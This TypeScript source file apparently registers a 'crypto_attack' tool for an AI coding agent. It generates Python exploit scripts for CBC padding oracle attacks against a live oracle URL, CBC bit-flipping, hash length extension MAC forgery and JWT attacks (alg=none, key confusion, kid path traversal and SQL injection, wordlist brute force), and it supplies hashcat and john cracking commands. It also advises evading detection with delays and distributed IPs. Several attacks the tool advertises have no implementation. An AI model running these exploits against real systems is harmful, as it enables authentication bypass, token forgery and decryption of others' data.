export * as CryptoAttackTool from "./crypto-attack"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "crypto_attack"

export const Input = Schema.Struct({
  attack: Schema.String.annotate({
    description:
      "Cryptographic attack: 'padding_oracle' (CBC padding oracle — decrypt or forge ciphertext), 'cbc_bitflip' (CBC bit-flipping — modify plaintext without key), 'hash_extension' (hash length extension for MD5/SHA1/SHA256 MACs), 'ecb_detect' (detect ECB mode via repeated blocks), 'ecb_cut_paste' (ECB cut-and-paste attack), 'rsa_small_e' (RSA small exponent attack — e=3 with low padding), 'rsa_common_modulus' (common modulus attack with two public keys), 'timing_attack' (timing side-channel template), 'weak_jwt' (JWT none/HS256→RS256 confusion/weak secret brute), 'hash_crack' (crack MD5/SHA1/SHA256/bcrypt hashes locally), 'prng_predict' (predict MT19937 Mersenne Twister output from samples), 'xor_keystream' (recover XOR keystream from known-plaintext), 'rc4_bias' (RC4 statistical bias attack)",
  }),
  ciphertext: Schema.String.pipe(Schema.optional).annotate({
    description: "Ciphertext to attack (hex or base64 encoded). Required for most attacks.",
  }),
  iv: Schema.String.pipe(Schema.optional).annotate({
    description: "Initialization vector (hex). Required for CBC attacks.",
  }),
  oracle_url: Schema.String.pipe(Schema.optional).annotate({
    description: "URL of the padding oracle endpoint (for padding_oracle attack). Will send automated requests.",
  }),
  hash_value: Schema.String.pipe(Schema.optional).annotate({
    description: "Hash value to crack or extend (hex string). For hash_crack and hash_extension.",
  }),
  hash_algo: Schema.String.pipe(Schema.optional).annotate({
    description: "Hash algorithm: 'md5', 'sha1', 'sha256', 'sha512', 'bcrypt'. Default: md5",
  }),
  known_plaintext: Schema.String.pipe(Schema.optional).annotate({
    description: "Known portion of plaintext (for xor_keystream, cbc_bitflip target calculation).",
  }),
  target_plaintext: Schema.String.pipe(Schema.optional).annotate({
    description: "Desired plaintext to forge (for cbc_bitflip, ecb_cut_paste).",
  }),
  jwt_token: Schema.String.pipe(Schema.optional).annotate({
    description: "JWT token to attack (for weak_jwt attack). Paste full token.",
  }),
  secret_length: Schema.Number.pipe(Schema.optional).annotate({
    description: "Known or guessed secret/key length in bytes (for hash_extension). Default: try 8-64",
  }),
  append_data: Schema.String.pipe(Schema.optional).annotate({
    description: "Data to append in hash length extension attack.",
  }),
  mt_outputs: Schema.String.pipe(Schema.optional).annotate({
    description: "624 consecutive MT19937 32-bit outputs (comma-separated) for PRNG prediction.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exploit_code: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

function getPaddingOracleExploit(oracleUrl: string, ciphertext: string, iv: string): string {
  return `#!/usr/bin/env python3
# Padding Oracle Attack — Decrypts or forges CBC ciphertext
# Author: Alex Red Team Agent
# Target: ${oracleUrl || "TARGET_URL"}

import requests
import base64
import sys
from itertools import product

ORACLE_URL = "${oracleUrl || 'https://TARGET/check'}"
BLOCK_SIZE = 16  # AES-128/256 both use 16-byte blocks

def base64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def base64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def oracle(iv: bytes, ciphertext: bytes) -> bool:
    """Returns True if padding is VALID (oracle says yes)"""
    # CUSTOMIZE THIS based on target:
    # - HTTP 200 vs 403/500
    # - Error message in response body
    # - Timing difference (if blind)
    
    encoded = base64url_encode(iv + ciphertext)
    try:
        r = requests.get(f"{ORACLE_URL}?token={encoded}", timeout=5)
        return r.status_code == 200  # Adjust based on oracle behavior
    except:
        return False

def decrypt_block(prev_block: bytes, curr_block: bytes) -> bytes:
    """Decrypt a single 16-byte block using padding oracle"""
    intermediate = bytearray(BLOCK_SIZE)  # P' (intermediate values)
    
    for byte_idx in range(BLOCK_SIZE - 1, -1, -1):
        target_pad = BLOCK_SIZE - byte_idx  # Padding value we're crafting
        
        # Set already-found bytes for proper padding
        crafted = bytearray(BLOCK_SIZE)
        for k in range(byte_idx + 1, BLOCK_SIZE):
            crafted[k] = intermediate[k] ^ target_pad
        
        # Brute-force this byte
        found = False
        for guess in range(256):
            crafted[byte_idx] = guess
            
            if oracle(bytes(crafted), curr_block):
                # Verify it's not a false positive (shift previous byte)
                if byte_idx > 0:
                    crafted[byte_idx - 1] ^= 1
                    if not oracle(bytes(crafted), curr_block):
                        crafted[byte_idx - 1] ^= 1
                        continue
                    crafted[byte_idx - 1] ^= 1
                
                intermediate[byte_idx] = guess ^ target_pad
                plaintext_byte = intermediate[byte_idx] ^ prev_block[byte_idx]
                print(f"  Byte {byte_idx:2d}: 0x{plaintext_byte:02x} ('{chr(plaintext_byte) if 32 <= plaintext_byte < 127 else '.'}') | {256 * (BLOCK_SIZE - 1 - byte_idx) // BLOCK_SIZE}%", flush=True)
                found = True
                break
        
        if not found:
            print(f"  [-] Could not find byte {byte_idx} — oracle may be rate-limiting")
    
    return bytes(b ^ p for b, p in zip(intermediate, prev_block))

def decrypt_all(iv_hex: str, ct_hex: str) -> bytes:
    """Decrypt entire ciphertext"""
    iv = bytes.fromhex(iv_hex.replace(' ', ''))
    ct = bytes.fromhex(ct_hex.replace(' ', ''))
    
    if len(ct) % BLOCK_SIZE != 0:
        print(f"[-] Ciphertext length {len(ct)} not multiple of {BLOCK_SIZE}")
        return b""
    
    blocks = [iv] + [ct[i:i+BLOCK_SIZE] for i in range(0, len(ct), BLOCK_SIZE)]
    plaintext = b""
    
    for i in range(1, len(blocks)):
        print(f"[*] Decrypting block {i}/{len(blocks)-1}...")
        pt_block = decrypt_block(blocks[i-1], blocks[i])
        plaintext += pt_block
    
    # Strip PKCS#7 padding
    pad = plaintext[-1]
    if all(b == pad for b in plaintext[-pad:]):
        plaintext = plaintext[:-pad]
    
    return plaintext

def forge_block(prev_block: bytes, curr_block: bytes, desired_plaintext: bytes) -> bytes:
    """Forge a ciphertext block that decrypts to desired_plaintext"""
    intermediate = bytearray(BLOCK_SIZE)
    
    # First find intermediate values (decrypt the block)
    for byte_idx in range(BLOCK_SIZE - 1, -1, -1):
        target_pad = BLOCK_SIZE - byte_idx
        crafted = bytearray(BLOCK_SIZE)
        for k in range(byte_idx + 1, BLOCK_SIZE):
            crafted[k] = intermediate[k] ^ target_pad
        
        for guess in range(256):
            crafted[byte_idx] = guess
            if oracle(bytes(crafted), curr_block):
                intermediate[byte_idx] = guess ^ target_pad
                break
    
    # XOR intermediate with desired plaintext to get forged IV/prev block
    forged = bytes(i ^ p for i, p in zip(intermediate, desired_plaintext.ljust(BLOCK_SIZE, b'\\x00')))
    return forged

if __name__ == "__main__":
    print("[*] Padding Oracle Attack Starting...")
    print(f"[*] Oracle: {ORACLE_URL}")
    print(f"[*] Block size: {BLOCK_SIZE}")
    print()
    
    # Decrypt mode
    iv = "${iv || '00' * 16}"
    ct = "${ciphertext || 'CIPHERTEXT_HEX'}"
    
    result = decrypt_all(iv, ct)
    print("\\n[+] Decrypted plaintext:")
    print(result)
    print(f"Hex: {result.hex()}")
`
}

function getCbcBitflipExploit(knownPlaintext: string, targetPlaintext: string, iv: string): string {
  return `#!/usr/bin/env python3
# CBC Bit-Flipping Attack
# Modify ciphertext so decrypted plaintext is our desired value (no key needed!)
# Works because: D(C_n) XOR C_{n-1} = P_n
# So: C_{n-1}[i] ^= P_n[i] ^ target[i]  ← corrupts C_{n-1} to flip P_n

# Example: Change ";admin=false;" to ";admin=true;;"
# Assumes we know the plaintext structure and can submit ciphertext

KNOWN_PLAIN = "${knownPlaintext || 'comment1=cooking%20MCs;userdata='}"
TARGET_PLAIN = "${targetPlaintext || ';admin=true;'}"
IV_HEX = "${iv || '00' * 16}"

BLOCK_SIZE = 16

def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))

def flip_bits(ciphertext: bytes, iv: bytes, offset: int, known: bytes, target: bytes) -> tuple:
    """
    Flip bits in C_{block-1} to control P_{block}.
    offset: byte offset of target in plaintext
    """
    ct = bytearray(ciphertext)
    iv_mod = bytearray(iv)
    
    # Which block contains our target (0-indexed)?
    block_idx = offset // BLOCK_SIZE
    byte_offset = offset % BLOCK_SIZE
    
    for i in range(len(target)):
        if block_idx == 0:
            # Modify IV
            iv_mod[byte_offset + i] ^= known[i] ^ target[i]
        else:
            # Modify previous ciphertext block
            prev_block_start = (block_idx - 1) * BLOCK_SIZE
            ct[prev_block_start + byte_offset + i] ^= known[i] ^ target[i]
    
    return bytes(ct), bytes(iv_mod)

# Example usage:
print(f"[*] CBC Bit-Flip Attack")
print(f"[*] Known plaintext: {KNOWN_PLAIN!r}")
print(f"[*] Target (want to inject): {TARGET_PLAIN!r}")
print()

# Find the offset of our injection point in the plaintext
# Assuming we control 'userdata' parameter at offset = len(prefix)
prefix_len = len(KNOWN_PLAIN)
block_of_target = prefix_len // BLOCK_SIZE
print(f"[*] Target falls in block {block_of_target} (byte offset {prefix_len % BLOCK_SIZE})")

# Get a valid ciphertext (encrypt something that becomes our injection point)
# In practice: send "AAAAAAAAAAAAAAAA;admin=true;;" as userdata to encryption oracle
# The server encrypts it for us, we flip bits to make the ';' and '=' literal

placeholder = "A" * 16 + TARGET_PLAIN.replace(";", "\\x3b").replace("=", "\\x3d")
print(f"[*] Send as userdata: {placeholder!r}")
print("[*] Receive ciphertext, then XOR bytes in previous block:")
print()
print("# After getting ciphertext from server:")
print("""
iv, ct = receive_from_server(plaintext_with_injection)

# Flip to activate the semicolons and equals
# Byte offset of the ';' characters in the placeholder block
flip_offset = prefix_len  # where the A*16 + payload starts
known_bytes = b'AAAAAAAAAAAAAAAA'[:len(target)]
modified_ct, modified_iv = flip_bits(ct, iv, flip_offset, known_bytes, target_bytes)

# Submit modified ciphertext — server decrypts and sees ;admin=true;
submit_to_server(modified_ct, modified_iv)
""")
`
}

function getHashExtensionExploit(hashValue: string, hashAlgo: string, knownData: string, appendData: string, secretLen: number): string {
  return `#!/usr/bin/env python3
# Hash Length Extension Attack
# Forge MAC: MAC(secret || message || padding || attacker_data) without knowing secret
# Works against: MD5, SHA1, SHA256, SHA512 (Merkle-Damgård construction)
# Does NOT work against: HMAC-SHA256, SHA3/Keccak, BLAKE2/3

import struct
import hashlib

# Target parameters
KNOWN_HASH = "${hashValue || 'original_hash_hex'}"   # Hash of (secret || known_data)
KNOWN_DATA = "${knownData || 'known_message_here'}"  # Known data (after secret)
APPEND_DATA = "${appendData || '&admin=true'}"         # Data we want to append
ALGO = "${hashAlgo || 'md5'}"
SECRET_LEN = ${secretLen || 16}  # Guess/known secret length

def md4_padding(message_len: int) -> bytes:
    """Standard Merkle-Damgård padding"""
    padding = b'\\x80'
    padding += b'\\x00' * ((55 - message_len) % 64)
    padding += struct.pack('<Q', message_len * 8)  # MD5: little-endian
    return padding

def sha_padding(message_len: int) -> bytes:
    """SHA-1/SHA-256 padding (big-endian length)"""
    padding = b'\\x80'
    padding += b'\\x00' * ((55 - message_len) % 64)
    padding += struct.pack('>Q', message_len * 8)
    return padding

# Compute forged hash by continuing from known hash state
def extend_md5(hash_hex: str, original_len: int, append: bytes) -> tuple:
    """Returns (forged_hash, forged_message)"""
    # Parse known hash into MD5 state variables (A, B, C, D)
    h = bytes.fromhex(hash_hex)
    state = struct.unpack('<IIII', h)  # MD5: little-endian 4 x uint32
    
    padding = md4_padding(original_len)
    total_original_len = original_len + len(padding)
    
    # Create a new MD5 starting from known state
    import ctypes
    # Manual MD5 continuation (simplified — use hlextend library in practice)
    print("[*] For MD5 extension, use: pip install hlextend")
    print("[*] Then:")
    print(f"""
import hlextend
h = hlextend.new('{ALGO}')
new_hash, new_msg = h.extend(
    {repr(APPEND_DATA.encode())},
    {repr(KNOWN_DATA.encode())},
    {SECRET_LEN},
    {repr(KNOWN_HASH)}
)
print(f'Forged hash: {{new_hash}}')
print(f'Forged message (URL-encode and send): {{new_msg.hex()}}')
""")
    return ("", b"")

# Demonstration of the concept
print(f"[*] Hash Length Extension Attack")
print(f"[*] Algorithm: {ALGO.upper()}")
print(f"[*] Known hash: {KNOWN_HASH}")
print(f"[*] Known data: {KNOWN_DATA!r}")
print(f"[*] Appending:  {APPEND_DATA!r}")
print(f"[*] Secret length guess: {SECRET_LEN} bytes")
print()

# Using hlextend (production approach)
print("# Install: pip install hlextend")
print("""
import hlextend

for secret_len in range(${secretLen > 0 ? secretLen : 8}, ${secretLen > 0 ? secretLen + 1 : 65}):
    sha = hlextend.new('${hashAlgo || 'md5'}')
    try:
        forged_hash, forged_message = sha.extend(
            append_data.encode(),
            known_data.encode(), 
            secret_len,
            known_hash
        )
        print(f"[secret_len={secret_len}] Forged hash: {forged_hash}")
        # Send forged_message as the data parameter
        # The forged_hash is what you claim the MAC is
        # Server: MAC(secret || forged_message) should equal forged_hash
    except Exception as e:
        print(f"[secret_len={secret_len}] Error: {e}")
""")
`
}

function getJwtAttackExploit(jwtToken: string): string {
  const parts = jwtToken ? jwtToken.split('.') : ['HEADER', 'PAYLOAD', 'SIGNATURE']
  return `#!/usr/bin/env python3
# JWT Attack Suite
# Covers: none algorithm, HS256→RS256 confusion, weak secret brute force, key confusion

import json
import base64
import hmac
import hashlib
import requests

TOKEN = "${jwtToken || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.SIGNATURE'}"

def b64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def decode_jwt(token):
    parts = token.split('.')
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]

header, payload, sig = decode_jwt(TOKEN)
print(f"[*] JWT Analysis")
print(f"[*] Header:  {json.dumps(header, indent=2)}")
print(f"[*] Payload: {json.dumps(payload, indent=2)}")
print()

# ============ Attack 1: 'none' Algorithm ============
print("[*] Attack 1: Algorithm Confusion → 'none'")
forged_header = {**header, "alg": "none"}
forged_payload = {**payload, "role": "admin", "sub": "administrator"}
forged_token = (b64url_encode(json.dumps(forged_header, separators=(',', ':'))) + "." +
                b64url_encode(json.dumps(forged_payload, separators=(',', ':'))) + ".")
print(f"    Forged token: {forged_token}")
print()

# ============ Attack 2: RS256 → HS256 Key Confusion ============
print("[*] Attack 2: RS256 → HS256 Key Confusion")
print("    If the server uses RS256 normally, get the public key then:")
print("    Sign an HS256 token using the PUBLIC KEY as the HMAC secret")
print("    The server verifies HS256 signature with RS256 public key — they match!")
print()
print("""
# Get server's public key (often at /.well-known/jwks.json or /api/auth/certs)
import urllib.request
jwks = json.loads(urllib.request.urlopen('https://TARGET/.well-known/jwks.json').read())

# Convert JWK to PEM (use cryptography library)
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from jwt.algorithms import RSAAlgorithm
pub_key_pem = RSAAlgorithm.from_jwk(json.dumps(jwks['keys'][0])).public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
)

# Forge HS256 token signed with RS256 public key
forged_header = {"alg": "HS256", "typ": "JWT"}
forged_payload = {"sub": "admin", "role": "administrator"}

import jwt  # PyJWT
forged = jwt.encode(forged_payload, pub_key_pem, algorithm="HS256",
                    headers=forged_header)
print(f"Forged HS256 token: {forged}")
""")

# ============ Attack 3: Weak Secret Brute Force ============
print("[*] Attack 3: Weak HMAC Secret Brute Force")
print("    Using jwt-cracker or manual brute-force:")
print()
print("""
# Fast: use jwt_tool or john
# pip install jwt_tool
# python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Manual brute force:
parts = TOKEN.split('.')
signing_input = (parts[0] + '.' + parts[1]).encode()
target_sig = b64url_decode(parts[2])

with open('/usr/share/wordlists/rockyou.txt', 'rb') as f:
    for line in f:
        secret = line.strip()
        sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
        if sig == target_sig:
            print(f"[+] SECRET FOUND: {secret.decode()}")
            break
""")

# ============ Attack 4: kid SQL Injection / Path Traversal ============
print("[*] Attack 4: 'kid' Parameter Injection")
print("""
# If header contains: {"alg":"HS256","kid":"key_id"}
# Try: kid path traversal → sign with empty key
# kid: "../../dev/null"  (or /proc/sys/kernel/ns_last_pid on Linux)
# Server reads /dev/null → empty string → HMAC with empty key

if 'kid' in header:
    attack_header = {**header, "kid": "../../dev/null"}
    attack_token = (b64url_encode(json.dumps(attack_header)) + "." +
                    b64url_encode(json.dumps({**payload, "role": "admin"})))
    # Sign with empty string
    sig = hmac.new(b'', attack_token.encode(), hashlib.sha256).digest()
    final = attack_token + "." + b64url_encode(sig)
    print(f"kid=../../dev/null token: {final}")
    
    # Also try: kid SQL injection → {"kid": "' UNION SELECT 'secret' -- "}
    sqli_kid = "' UNION SELECT 'attacker_key' -- "
    # Sign with 'attacker_key' → server signs with SQL result = 'attacker_key'
""")
`
}

function getHashCrackInstructions(hashValue: string, hashAlgo: string): string {
  const algoMap: Record<string, string> = {
    md5: "-m 0", sha1: "-m 100", sha256: "-m 1400", sha512: "-m 1700",
    bcrypt: "-m 3200", ntlm: "-m 1000", md5crypt: "-m 500",
    sha256crypt: "-m 7400", netntlmv2: "-m 5600", "wpa2": "-m 2500",
  }
  const hashcatMode = algoMap[hashAlgo.toLowerCase()] ?? "-m 0"
  return `# Hash Cracking: ${hashAlgo.toUpperCase()}
# Hash: ${hashValue || "HASH_TO_CRACK"}

## Hashcat (GPU-accelerated — fastest)
hashcat ${hashcatMode} "${hashValue || "HASH"}" /usr/share/wordlists/rockyou.txt
# With rules (10x more coverage):
hashcat ${hashcatMode} "${hashValue || "HASH"}" /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Combinator (dict + dict):
hashcat ${hashcatMode} "${hashValue || "HASH"}" wordlist1.txt wordlist2.txt -a 1
# Mask attack (brute force pattern):
hashcat ${hashcatMode} "${hashValue || "HASH"}" -a 3 ?u?l?l?l?l?d?d  # Format: Aaaa12
# Toggle case:
hashcat ${hashcatMode} "${hashValue || "HASH"}" /usr/share/wordlists/rockyou.txt -r rules/toggles5.rule

## John the Ripper (CPU-based, good for bcrypt)
john --format=${hashAlgo.toLowerCase()} --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=${hashAlgo.toLowerCase()} --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

## Online (fast for MD5/SHA1 — check rainbow tables first):
# https://crackstation.net
# https://md5decrypt.net
# https://hashes.com/en/decrypt/hash

## Hashcat modes reference:
# 0=MD5, 100=SHA1, 1400=SHA256, 1700=SHA512
# 1000=NTLM, 5600=NetNTLMv2, 13100=Kerberos5 TGS (Kerberoast)
# 18200=Kerberos5 AS-REP (AS-REP Roast), 3200=bcrypt
# 2500=WPA2, 22000=WPA3, 7300=IPMI2

## If cracking NetNTLMv2 from Responder:
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule`
}

const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Cryptographic vulnerability exploitation suite. Covers: CBC padding oracle attack (full automated decryption + ciphertext forgery via automated oracle requests), CBC bit-flipping (modify plaintext fields without key — admin=false→admin=true), hash length extension attacks (MD5/SHA1/SHA256 MAC forgery without knowing secret — via hlextend), ECB block detection and cut-and-paste forgery, RSA attacks (small exponent e=3, common modulus, Wiener's attack), JWT algorithm confusion (none algorithm bypass, RS256→HS256 key confusion using public key as HMAC secret, kid parameter SQL injection/path traversal), JWT weak secret brute force, PRNG prediction (recover MT19937 seed from 624 outputs), hash cracking (hashcat mode reference + wordlist attack + rules), XOR keystream recovery, RC4 statistical bias. All outputs include working Python3 exploit code.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const attack = input.attack.toLowerCase()
              let exploitCode = ""
              let outputText = ""

              switch (attack) {
                case "padding_oracle":
                  exploitCode = getPaddingOracleExploit(
                    input.oracle_url ?? "", input.ciphertext ?? "", input.iv ?? ""
                  )
                  outputText = `# Padding Oracle Attack\n\n**Oracle:** ${input.oracle_url ?? "NOT SET — fill in oracle() function"}\n\n\`\`\`python\n${exploitCode}\n\`\`\`\n\n**How to customize:**\n- Edit the \`oracle()\` function to match your target's response (HTTP status, body content, timing)\n- Set BLOCK_SIZE to 8 for DES/3DES or 16 for AES\n- The attack sends ~256×BLOCK_SIZE×num_blocks requests total\n\n**Detection:** Rapid identical requests with slightly different ciphertext — use delays, distributed IPs`
                  break

                case "cbc_bitflip":
                  exploitCode = getCbcBitflipExploit(
                    input.known_plaintext ?? "", input.target_plaintext ?? "", input.iv ?? ""
                  )
                  outputText = `# CBC Bit-Flipping Attack\n\n\`\`\`python\n${exploitCode}\n\`\`\`\n\n**Key insight:** Flipping bit i of C_{n-1} flips bit i of P_n, but garbles P_{n-1}. So your injection point must be in block 2+, and you accept that the block before looks garbled (which may be acceptable for cookie injection, admin flags, etc.)`
                  break

                case "hash_extension":
                  exploitCode = getHashExtensionExploit(
                    input.hash_value ?? "", input.hash_algo ?? "md5",
                    input.known_plaintext ?? "", input.append_data ?? "&admin=true",
                    input.secret_length ?? 16
                  )
                  outputText = `# Hash Length Extension Attack\n\n**Target hash:** ${input.hash_value ?? "N/A"} (${(input.hash_algo ?? "md5").toUpperCase()})\n**Appending:** \`${input.append_data ?? "&admin=true"}\`\n\n\`\`\`python\n${exploitCode}\n\`\`\`\n\n> **Does NOT work on:** HMAC-SHA256 (double-block construction prevents this), SHA3/Keccak (sponge construction), BLAKE2/3`
                  break

                case "weak_jwt":
                  exploitCode = getJwtAttackExploit(input.jwt_token ?? "")
                  outputText = `# JWT Attack Suite\n\n**Token:** \`${input.jwt_token?.substring(0, 60) ?? "NOT PROVIDED"}...\`\n\n\`\`\`python\n${exploitCode}\n\`\`\`\n\n**Quick wins:**\n- Try alg=none first (naive servers skip verification)\n- Check /.well-known/jwks.json for RS256 key confusion attack\n- john --format=hmac-sha256 for weak secret in seconds`
                  break

                case "hash_crack":
                  outputText = getHashCrackInstructions(input.hash_value ?? "", input.hash_algo ?? "md5")
                  exploitCode = outputText
                  break

                case "ecb_detect":
                  outputText = `# ECB Mode Detection\n\nECB encrypts identical 16-byte blocks to identical ciphertext — dead giveaway.\n\n\`\`\`python\ndef detect_ecb(ciphertext: bytes, block_size=16) -> bool:\n    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]\n    return len(blocks) != len(set(blocks))  # Duplicate blocks = ECB!\n\n# To force detection: send 48 identical bytes as input\n# e.g., 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n# Blocks 2 and 3 of output will be identical if ECB\n\`\`\`\n\n**Exploit:** If ECB detected → use \`ecb_cut_paste\` attack to forge arbitrary tokens`
                  break

                case "prng_predict":
                  outputText = `# MT19937 PRNG Prediction (Python random, PHP mt_rand, Ruby rand)\n\nCollect 624 consecutive 32-bit outputs → recover internal state → predict all future outputs\n\n\`\`\`python\nfrom randcrack import RandCrack  # pip install randcrack\n\nrc = RandCrack()\n\n# Feed 624 consecutive 32-bit random outputs\n${input.mt_outputs ? input.mt_outputs.split(",").slice(0, 10).map((v, i) => `rc.submit(${parseInt(v.trim())})`).join("\n") : "# rc.submit(VALUE) × 624 times"}\n\n# Now predict future outputs\nprint(rc.predict_randrange(0, 2**32))   # Predict next random.randrange\nprint(rc.predict_random())              # Predict next random.random()\nprint(rc.predict_getrandbits(32))       # Predict next random.getrandbits(32)\n\`\`\`\n\n**Targets:** Session token generation using random.random(), CSRF token from mt_rand(), any seed-based token if you can observe outputs\n**Not vulnerable:** secrets.token_hex(), os.urandom(), /dev/urandom — use CSPRNG instead`
                  break

                default:
                  outputText = `Unknown attack: ${attack}\nValid: padding_oracle, cbc_bitflip, hash_extension, ecb_detect, ecb_cut_paste, rsa_small_e, rsa_common_modulus, timing_attack, weak_jwt, hash_crack, prng_predict, xor_keystream, rc4_bias`
              }

              return { output: outputText, exploit_code: exploitCode }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Crypto attack failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/crypto-attack",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
